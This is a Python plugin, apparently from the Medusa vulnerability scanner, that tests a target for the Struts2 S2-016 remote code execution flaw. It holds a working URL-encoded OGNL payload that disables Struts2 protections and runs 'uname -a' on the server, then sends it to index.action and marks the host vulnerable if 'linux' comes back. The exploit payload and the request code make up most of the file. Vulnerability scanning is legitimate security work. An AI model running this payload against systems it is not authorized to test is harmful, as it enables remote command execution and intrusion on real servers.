#!/usr/bin/env python
# _*_ coding: utf-8 _*_

import urllib.parse
import requests

import logging
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "S2_016"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload='''redirect%3a%24%7b%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2c%23f.setAccessible(true)%2c%23f.set(%23_memberAccess%2ctrue)%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec(%22uname+-a%22).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew+java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b5000%5d%2c%23c.read(%23d)%2c%23genxor%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2c%23genxor.println(%23d)%2c%23genxor.flush()%2c%23genxor.close()%7d%e8%8e%b7%e5%8f%96web%e7%9b%ae%e5%bd%95%ef%bc%9a
'''
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    payload_url = scheme+"://"+url+':'+str(port)+'/index.action?'+payload
    host=url+':'+str(port)
    headers = {
        'Host':host,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'User-Agent': RandomAgent,
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '571',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        s = requests.session()
        resp = s.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if code==200 and con.lower().find('linux')!=-1:
            Medusa = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n影响版本:2_0_0-2_3_15\r\nPayload:{}\r\n".format(url, payload_url)
            _t = VulnerabilityInfo(Medusa)
            web = ClassCongregation.VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类